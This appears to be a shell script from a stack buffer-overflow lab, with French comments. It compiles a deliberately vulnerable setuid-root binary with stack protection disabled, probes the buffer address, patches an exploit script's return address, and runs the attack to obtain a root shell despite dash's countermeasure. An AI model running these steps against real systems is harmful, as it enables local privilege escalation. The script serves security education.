#!/bin/bash
# T4.1 - Protection de dash. Reutilise la calibration de T3_L1.sh (meme
# binaire stack-L1, meme offset=112) pour exploit_L1_dash.py.
source "$(dirname "$0")/00_config.sh" || exit 1
sudo ln -sf /bin/dash /bin/sh
cd "$E3" || exit 1

echo "=== Mesure reelle de &buffer (sonde temporaire, stack-L1) ==="
cp stack.c stack_probe_tmp.c
sed -i '/char buffer\[BUF_SIZE\];/a\    printf("PROBE &buffer = %p\\n", (void*)buffer); fflush(stdout);' stack_probe_tmp.c
gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -o stack-L1 stack_probe_tmp.c
touch badfile
PROBE_OUT=$(timeout 2 ./stack-L1 2>&1)
BUF_HEX=$(echo "$PROBE_OUT" | grep -oE '0x[0-9a-fA-F]+' | tail -1)
rm -f stack_probe_tmp.c
RET_HEX=$(python3 -c "print(hex($BUF_HEX + 300))")
echo "&buffer=$BUF_HEX  ret=$RET_HEX"

gcc -DBUF_SIZE=100 -m32 -z execstack -fno-stack-protector -o stack-L1 stack.c
sudo chown root stack-L1
sudo chmod 4755 stack-L1

sed -i -E "s/^ret[[:space:]]*=.*/ret    = $RET_HEX/" "$E4/dash/exploit_L1_dash.py"

echo "=== Volet 1 : verification autonome setuid(0) ==="
cd "$E4/dash"
gcc -m32 -z execstack -o a32_nosetuid.out "$E2/call_shellcode.c"
gcc -m32 -z execstack -o a32_setuid.out   call_shellcode_setuid.c
sudo chown root a32_nosetuid.out a32_setuid.out
sudo chmod 4755 a32_nosetuid.out a32_setuid.out

echo "--- sans setuid(0) (attendu: PAS root) ---"
./a32_nosetuid.out
i

echo "--- avec setuid(0) (attendu: uid=0) ---"
./a32_setuid.out
id


echo "=== Volet 2 : attaque complete sur stack-L1 (dash actif) ==="
ls -l /bin/sh /bin/zsh /bin/dash
cd "$E3" || exit 1
python3 "$E4/dash/exploit_L1_dash.py"
./stack-L1
id
exit
